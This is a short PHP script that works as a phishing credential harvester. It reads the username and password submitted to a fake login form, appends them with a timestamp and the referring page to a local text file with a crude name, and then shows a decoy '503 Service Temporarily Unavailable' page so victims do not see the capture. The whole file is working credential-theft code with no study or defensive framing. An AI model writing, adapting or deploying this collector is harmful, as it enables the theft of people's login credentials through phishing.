<?php
$ref = $_SERVER['HTTP_REFERER'];
$today = date("F j, Y, g:i a");
if (isset($_POST['name']) && !empty($_POST['name'])) {
        $nam = stripslashes($_POST['name']);
        $pas = stripslashes($_POST['pass']);
        $nam = htmlspecialchars($nam, ENT_QUOTES);
        $pas = htmlspecialchars($pas, ENT_QUOTES);

        $content = $today . " -- " . $ref . " -- " . $nam . " -- " . $pas;

        $filed = @fopen("bitches.txt", "a+");
        @fwrite($filed, "$content\n");
        @fclose($filed);
}
?>

<html><body>
<h1>503: Service Temporarily Unavailable</h1>
</body></html>

